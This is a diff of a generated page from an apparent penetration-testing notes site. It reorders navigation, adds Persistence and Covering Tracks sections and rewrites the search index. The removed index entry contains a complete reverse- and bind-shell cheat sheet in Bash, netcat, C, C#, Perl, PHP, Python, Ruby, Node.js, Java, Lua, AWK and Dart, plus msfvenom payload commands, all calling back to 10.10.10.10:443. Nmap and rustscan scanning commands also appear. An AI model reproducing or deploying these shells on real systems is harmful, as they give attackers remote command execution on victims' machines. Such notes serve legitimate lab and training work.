@@ -87,7 +87,7 @@
                         
                         <li class="">
                             <a class="sidebar-root-link" href="https://documentnation.github.io/docs/htb/">
-                                <i class="material-icons me-2">tag</i>
+                                <i class="material-icons me-2">deployed_code</i>
                                 
                                 HTB
                             </a>
@@ -96,45 +96,9 @@
                 
                     
                     
-                        <li class="sidebar-dropdown  ">
-                            <button class="btn">
-                                <i class="material-icons me-2">terminal</i>
-                                Shells
-                            </button>
-                            <div class="sidebar-submenu ">
-                                <ul>
-                                    
-                                        
-                                        
-                                            <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/shells/linux/">Linux</a></li>
-                                        
-                                    
-                                        
-                                        
-                                            <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/shells/web/">Web</a></li>
-                                        
-                                    
-                                </ul>
-                            </div>
-                        </li>
-                    
-                
-                    
-                        
-                        <li class="">
-                            <a class="sidebar-root-link" href="https://documentnation.github.io/docs/enumeration/">
-                                <i class="material-icons me-2">format_list_numbered_rtl</i>
-                                
-                                Enumeration
-                            </a>
-                        </li>
-                    
-                
-                    
-                    
                         <li class="sidebar-dropdown  current active">
                             <button class="btn">
-                                <i class="material-icons me-2">travel_explore</i>
+                                <i class="material-icons me-2">info</i>
                                 Reconnaissance
                             </button>
                             <div class="sidebar-submenu d-block">
@@ -147,6 +111,50 @@
                                     
                                 </ul>
                             </div>
+                        </li>
+                    
+                
+                    
+                        
+                        <li class="">
+                            <a class="sidebar-root-link" href="https://documentnation.github.io/docs/enumeration/">
+                                <i class="material-icons me-2">screen_search_desktop</i>
+                                
+                                Scanning &amp; Enumeration
+                            </a>
+                        </li>
+                    
+                
+                    
+                        
+                        <li class="">
+                            <a class="sidebar-root-link" href="https://documentnation.github.io/docs/exploitation/">
+                                <i class="material-icons me-2">tag</i>
+                                
+                                Exploitation
+                            </a>
+                        </li>
+                    
+                
+                    
+                        
+                        <li class="">
+                            <a class="sidebar-root-link" href="https://documentnation.github.io/docs/persistence/">
+                                <i class="material-icons me-2">room_preferences</i>
+                                
+                                Persistence
+                            </a>
+                        </li>
+                    
+                
+                    
+                        
+                        <li class="">
+                            <a class="sidebar-root-link" href="https://documentnation.github.io/docs/cleanup/">
+                                <i class="material-icons me-2">delete_sweep</i>
+                                
+                                Covering Tracks
+                            </a>
                         </li>
                     
                 
@@ -296,7 +304,7 @@
                                         <div class="docs-content col-12  mt-0">
                                             <div class="mb-0 d-flex">
                                                 
-                                                <i class="material-icons title-icon me-2">travel_explore</i>
+                                                <i class="material-icons title-icon me-2">info</i>
                                                 
                                                 <h1 class="content-title mb-0">
                                                     Reconnaissance
@@ -557,15 +565,6 @@
     index.add(
             {
                 id:  0 ,
-                href: "\/docs\/shells\/linux\/",
-                title: "Linux",
-                description: "Reverse link Bash link sh -i \u003e\u0026 /dev/tcp/10.10.10.10/443 0\u003e\u00261 NC link rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u003e\u00261|nc 10.10.10.10 443 \u003e/tmp/f nc 10.10.10.10 443 -e sh nc -c sh 10.10.10.10 443 Curl link C='curl -Ns telnet://10.10.10.10:443'; $C \u00261 | sh 2\u003e\u00261 | $C \u003e/dev/null C link #include #include #include #include #include #include #include int main(void){ int port = 443; struct sockaddr_in revsockaddr; int sockt = socket(AF_INET, SOCK_STREAM, 0); revsockaddr.",
-                content: "Reverse link Bash link sh -i \u003e\u0026 /dev/tcp/10.10.10.10/443 0\u003e\u00261 NC link rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u003e\u00261|nc 10.10.10.10 443 \u003e/tmp/f nc 10.10.10.10 443 -e sh nc -c sh 10.10.10.10 443 Curl link C='curl -Ns telnet://10.10.10.10:443'; $C \u00261 | sh 2\u003e\u00261 | $C \u003e/dev/null C link #include #include #include #include #include #include #include int main(void){ int port = 443; struct sockaddr_in revsockaddr; int sockt = socket(AF_INET, SOCK_STREAM, 0); revsockaddr.sin_family = AF_INET; revsockaddr.sin_port = htons(port); revsockaddr.sin_addr.s_addr = inet_addr(\"10.10.10.10\"); connect(sockt, (struct sockaddr *) \u0026revsockaddr, sizeof(revsockaddr)); dup2(sockt, 0); dup2(sockt, 1); dup2(sockt, 2); char * const argv[] = {\"sh\", NULL}; execve(\"sh\", argv, NULL); return 0; } C# link using System; using System.Text; using System.IO; using System.Diagnostics; using System.ComponentModel; using System.Linq; using System.Net; using System.Net.Sockets; namespace ConnectBack { public class Program { static StreamWriter streamWriter; public static void Main(string[] args) { using(TcpClient client = new TcpClient(\"10.10.10.10\", 443)) { using(Stream stream = client.GetStream()) { using(StreamReader rdr = new StreamReader(stream)) { streamWriter = new StreamWriter(stream); StringBuilder strInput = new StringBuilder(); Process p = new Process(); p.StartInfo.FileName = \"sh\"; p.StartInfo.CreateNoWindow = true; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.StartInfo.RedirectStandardInput = true; p.StartInfo.RedirectStandardError = true; p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler); p.Start(); p.BeginOutputReadLine(); while(true) { strInput.Append(rdr.ReadLine()); //strInput.Append(\"\\n\"); p.StandardInput.WriteLine(strInput); strInput.Remove(0, strInput.Length); } } } } } private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine) { StringBuilder strOutput = new StringBuilder(); if (!String.IsNullOrEmpty(outLine.Data)) { try { strOutput.Append(outLine.Data); streamWriter.WriteLine(strOutput); streamWriter.Flush(); } catch (Exception err) { } } } } } using System; using System.Diagnostics; namespace BackConnect { class ReverseBash { public static void Main(string[] args) { Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = \"sh\"; proc.StartInfo.Arguments = \"-c \\\"sh -i \u003e\u0026 /dev/tcp/10.10.10.10/443 0\u003e\u00261\\\"\"; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); while (!proc.StandardOutput.EndOfStream) { Console.WriteLine(proc.StandardOutput.ReadLine()); } } } } Perl link perl -e 'use Socket;$i=\"10.10.10.10\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\u003e\u0026S\");open(STDOUT,\"\u003e\u0026S\");open(STDERR,\"\u003e\u0026S\");exec(\"sh -i\");};' #!/usr/bin/perl -w use strict; use Socket; use FileHandle; use POSIX; my $VERSION = \"1.0\"; my $ip = '10.10.10.10'; my $port = 443; my $daemon = 1; my $authorised_client_pattern = qr(^127\\.0\\.0\\.1$); my $global_page = \"\"; my $fake_process_name = \"/usr/sbin/apache\"; $0 = \"[httpd]\"; if (defined($ENV{'REMOTE_ADDR'})) { cgiprint(\"Browser IP address appears to be: $ENV{'REMOTE_ADDR'}\"); if ($auth) { unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) { cgiprint(\"ERROR: Your client isn't authorised to view this page\"); cgiexit(); } } } elsif ($auth) { cgiprint(\"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access\"); cgiexit(0); } if ($daemon) { my $pid = fork(); if ($pid) { } setsid(); chdir('/'); umask(0); } socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp')); if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) { cgiprint(\"Sent reverse shell to $ip:$port\"); cgiprintpage(); } else { cgiprint(\"Couldn't open reverse shell to $ip:$port: $!\"); cgiexit();\t} open(STDIN, \"\u003e\u0026SOCK\"); open(STDOUT,\"\u003e\u0026SOCK\"); open(STDERR,\"\u003e\u0026SOCK\"); $ENV{'HISTFILE'} = '/dev/null'; system(\"w;uname -a;id;pwd\"); exec({\"sh\"} ($fake_process_name, \"-i\")); sub cgiprint { my $line = shift; $line .= \"\\n\"; $global_page .= $line; } sub cgiexit { cgiprintpage(); } sub cgiprintpage { print \"Content-Length: \" . length($global_page) . \"\\r Connection: close\\r Content-Type: text\\/html\\r\\n\\r\\n\" . $global_page; } PHP link \u003c?php system('bash -c \"sh -i \u003e\u0026 /dev/tcp/10.10.10.10/443 0\u003e\u00261\"') ?\u003e \u003c?php set_time_limit (0); $VERSION = \"1.0\"; $ip = '10.10.10.10'; $port = 443; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; sh -i'; $daemon = 0; $debug = 0; if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); if ($pid == -1) { printit(\"ERROR: Can't fork\"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit(\"Error: Can't setsid()\"); exit(1); } $daemon = 1; } else { printit(\"WARNING: Failed to daemonise. This is quite common and not fatal.\"); } chdir(\"/\"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\"$errstr ($errno)\"); exit(1); } $descriptorspec = array( 0 =\u003e array(\"pipe\", \"r\"), 1 =\u003e array(\"pipe\", \"w\"), 2 =\u003e array(\"pipe\", \"w\") ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\"Successfully opened reverse shell to $ip:$port\"); while (1) { if (feof($sock)) { printit(\"ERROR: Shell connection terminated\"); break; } if (feof($pipes[1])) { printit(\"ERROR: Shell process terminated\"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \"$string\\n\"; } } ?\u003e Python link export RHOST=\"10.10.10.10\";export RPORT=443;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")' python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")' Ruby link ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=\u003eTCPSocket.new(\"10.10.10.10\",443))' Node.js link require('child_process').exec('nc -e sh 10.10.10.10 443') (function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"sh\", []); var client = new net.Socket(); client.connect(443, \"10.10.10.10\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application from crashing })(); Java link public class shell { public static void main(String[] args) { Process p; try { p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i \u003e\u0026 /dev/tcp/10.10.10.10/443 0\u003e\u00261\"); p.waitFor(); p.destroy(); } catch (Exception e) {} } } import java.io.InputStream; import java.io.OutputStream; import java.net.Socket; public class shell { public static void main(String[] args) { String host = \"10.10.10.10\"; int port = 443; String cmd = \"sh\"; try { Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start(); Socket s = new Socket(host, port); InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); OutputStream po = p.getOutputStream(), so = s.getOutputStream(); while (!s.isClosed()) { while (pi.available() \u003e 0) so.write(pi.read()); while (pe.available() \u003e 0) so.write(pe.read()); while (si.available() \u003e 0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try { p.exitValue(); break; } catch (Exception e) {} } p.destroy(); s.close(); } catch (Exception e) {} } } Javascript link String command = \"var host = '10.10.10.10';\" + \"var port = 443;\" + \"var cmd = 'sh';\"+ \"var s = new java.net.Socket(host, port);\" + \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();\"+ \"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\"+ \"var po = p.getOutputStream(), so = s.getOutputStream();\"+ \"print ('Connected');\"+ \"while (!s.isClosed()) {\"+ \" while (pi.available() \u003e 0)\"+ \" so.write(pi.read());\"+ \" while (pe.available() \u003e 0)\"+ \" so.write(pe.read());\"+ \" while (si.available() \u003e 0)\"+ \" po.write(si.read());\"+ \" so.flush();\"+ \" po.flush();\"+ \" java.lang.Thread.sleep(50);\"+ \" try {\"+ \" p.exitValue();\"+ \" break;\"+ \" }\"+ \" catch (e) {\"+ \" }\"+ \"}\"+ \"p.destroy();\"+ \"s.close();\"; String x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\")\"; ref.add(new StringRefAddr(\"x\", x)); Telnet link TF=$(mktemp -u);mkfifo $TF \u0026\u0026 telnet 10.10.10.10 443 0\u003c$TF | sh 1\u003e$TF Zsh link zsh -c 'zmodload zsh/net/tcp \u0026\u0026 ztcp 10.10.10.10 443 \u0026\u0026 zsh \u003e\u0026$REPLY 2\u003e\u0026$REPLY 0\u003e\u0026$REPLY' Lua link lua -e \"require('socket');require('os');t=socket.tcp();t:connect('10.10.10.10','443');os.execute('sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263');\" lua5.1 -e 'local host, port = \"10.10.10.10\", 443 local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()' AWK link awk 'BEGIN {s = \"/inet/tcp/0/10.10.10.10/443\"; while(42) { do{ printf \"shell\u003e\" |\u0026 s; s |\u0026 getline c; if(c){ while ((c |\u0026 getline) \u003e 0) print $0 |\u0026 s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null Dart link import 'dart:io'; import 'dart:convert'; main() { Socket.connect(\"10.10.10.10\", 443).then((socket) { socket.listen((data) { Process.start('sh', []).then((Process process) { process.stdin.writeln(new String.fromCharCodes(data).trim()); process.stdout .transform(utf8.decoder) .listen((output) { socket.write(output); }); }); }, onDone: () { socket.destroy(); }); }); } Bind link Python link python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",443));s1.listen(1);c,a=s1.accept(); while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")' PHP link php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",443);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}' NC link rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2\u003e\u00261 | nc -l 0.0.0.0 443 \u003e /tmp/f Perl link perl -e 'use Socket;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\"\u003e\u0026C\");open(STDOUT,\"\u003e\u0026C\");open(STDERR,\"\u003e\u0026C\");exec(\"/bin/sh -i\");};' Metasploit link Linux Meterpreter Staged link msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f elf -o reverse.elf Linux Meterpreter Stageless link msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f elf -o reverse.elf PHP Meterpreter Stageless link msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw -o shell.php Reverse PHP link msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=443 -o shell.php JSP Stageless link msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw -o shell.jsp War Stageless Reverse link msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f war -o shell.war Python Stageless Reverse link msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=443 -f raw Bash Stageless Reverse link msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=443 -f raw -o shell.sh "
-            }
-        );
-    index.add(
-            {
-                id:  1 ,
                 href: "\/docs\/htb\/",
                 title: "HTB",
                 description: "",
@@ -574,18 +573,27 @@
         );
     index.add(
             {
+                id:  1 ,
+                href: "\/docs\/reconnaissance\/",
+                title: "Reconnaissance",
+                description: "",
+                content: ""
+            }
+        );
+    index.add(
+            {
                 id:  2 ,
-                href: "\/docs\/reconnaissance\/portscan\/",
-                title: "Portscan",
-                description: "Port Specification Options link Switch/Flag Example Description -p nmap -p 21 127.0.0.1 Scanning Specific Port -p nmap -p 21-100 127.0.0.1 Scanning Specific Port Range -sU sudo nmap -sU 110 127.0.0.1 UDP Port Scanning -p- nmap -p- 127.0.0.1 All Port Scanning -F nmap -F 127.0.0.1 Fast mode - Scan fewer ports than the default scan Port Scanning Types link Switch/Flag Example Description -sS nmap -sS 127.0.0.1 TCP SYN Scan -sT nmap -sT 127.",
-                content: " Port Specification Options link Switch/Flag Example Description -p nmap -p 21 127.0.0.1 Scanning Specific Port -p nmap -p 21-100 127.0.0.1 Scanning Specific Port Range -sU sudo nmap -sU 110 127.0.0.1 UDP Port Scanning -p- nmap -p- 127.0.0.1 All Port Scanning -F nmap -F 127.0.0.1 Fast mode - Scan fewer ports than the default scan Port Scanning Types link Switch/Flag Example Description -sS nmap -sS 127.0.0.1 TCP SYN Scan -sT nmap -sT 127.0.0.1 TCP Connect Scan -sA sudo nmap -sA 127.0.0.1 TCP ACK Scan -sU sudo nmap -sU 127.0.0.1 UDP Port Scan -sX sudo nmap -sX 127.0.0.1 TCP Xmas Scan -sn nmap -sn 127.0.0.1 Ping Scan -sU sudo nmap -sU 127.0.0.1 UDP Port Scan Update Nmap Script Engine Scripts [NSE Scripts] link sudo nmap --script-updatedb Automated Bash Script linkThis script utilizes rustscan for faster scanning.\n#!/bin/bash if [ \"$#\" -ne 1 ]; then echo \"Usage: ports HOST\" exit 2 fi nmap -p- --min-rate 1000 $1 -oN all_ports -vvv -Pn ports=$(grep -iv not all_ports | grep -i 'open\\|filtered' | awk -F'/' '{ print $1 }' ORS=',') rustscan --ulimit 5000 -a $1 -p $ports -- -Pn -A --script vuln -oN nmap rm ./all_ports Rustscan link rustscan -a 127.0.0.1 "
+                href: "\/docs\/enumeration\/",
+                title: "Scanning \u0026 Enumeration",
+                description: "",
+                content: ""
             }
         );
     index.add(
             {
                 id:  3 ,
-                href: "\/docs\/shells\/",
-                title: "Shells",
+                href: "\/docs\/exploitation\/",
+                title: "Exploitation",
                 description: "",
                 content: ""
             }
@@ -593,8 +601,8 @@
     index.add(
             {
                 id:  4 ,
-                href: "\/docs\/enumeration\/",
-                title: "Enumeration",
+                href: "\/docs\/persistence\/",
+                title: "Persistence",
                 description: "",
                 content: ""
             }
@@ -602,8 +610,8 @@
     index.add(
             {
                 id:  5 ,
-                href: "\/docs\/shells\/web\/",
-                title: "Web",
+                href: "\/docs\/cleanup\/",
+                title: "Covering Tracks",
                 description: "",
                 content: ""
             }
@@ -611,10 +619,10 @@
     index.add(
             {
                 id:  6 ,
-                href: "\/docs\/reconnaissance\/",
-                title: "Reconnaissance",
-                description: "",
-                content: ""
+                href: "\/docs\/reconnaissance\/portscan\/",
+                title: "Portscan",
+                description: "Port Specification Options link Switch/Flag Example Description -p nmap -p 21 127.0.0.1 Scanning Specific Port -p nmap -p 21-100 127.0.0.1 Scanning Specific Port Range -sU sudo nmap -sU 110 127.0.0.1 UDP Port Scanning -p- nmap -p- 127.0.0.1 All Port Scanning -F nmap -F 127.0.0.1 Fast mode - Scan fewer ports than the default scan Port Scanning Types link Switch/Flag Example Description -sS nmap -sS 127.0.0.1 TCP SYN Scan -sT nmap -sT 127.",
+                content: " Port Specification Options link Switch/Flag Example Description -p nmap -p 21 127.0.0.1 Scanning Specific Port -p nmap -p 21-100 127.0.0.1 Scanning Specific Port Range -sU sudo nmap -sU 110 127.0.0.1 UDP Port Scanning -p- nmap -p- 127.0.0.1 All Port Scanning -F nmap -F 127.0.0.1 Fast mode - Scan fewer ports than the default scan Port Scanning Types link Switch/Flag Example Description -sS nmap -sS 127.0.0.1 TCP SYN Scan -sT nmap -sT 127.0.0.1 TCP Connect Scan -sA sudo nmap -sA 127.0.0.1 TCP ACK Scan -sU sudo nmap -sU 127.0.0.1 UDP Port Scan -sX sudo nmap -sX 127.0.0.1 TCP Xmas Scan -sn nmap -sn 127.0.0.1 Ping Scan -sU sudo nmap -sU 127.0.0.1 UDP Port Scan Update Nmap Script Engine Scripts [NSE Scripts] link sudo nmap --script-updatedb Automated Bash Script linkThis script utilizes rustscan for faster scanning.\n#!/bin/bash if [ \"$#\" -ne 1 ]; then echo \"Usage: ports HOST\" exit 2 fi nmap -p- --min-rate 1000 $1 -oN all_ports -vvv -Pn ports=$(grep -iv not all_ports | grep -i 'open\\|filtered' | awk -F'/' '{ print $1 }' ORS=',') rustscan --ulimit 5000 -a $1 -p $ports -- -Pn -A --script vuln -oN nmap rm ./all_ports Rustscan link rustscan -a 127.0.0.1 "
             }
         );
     index.add(
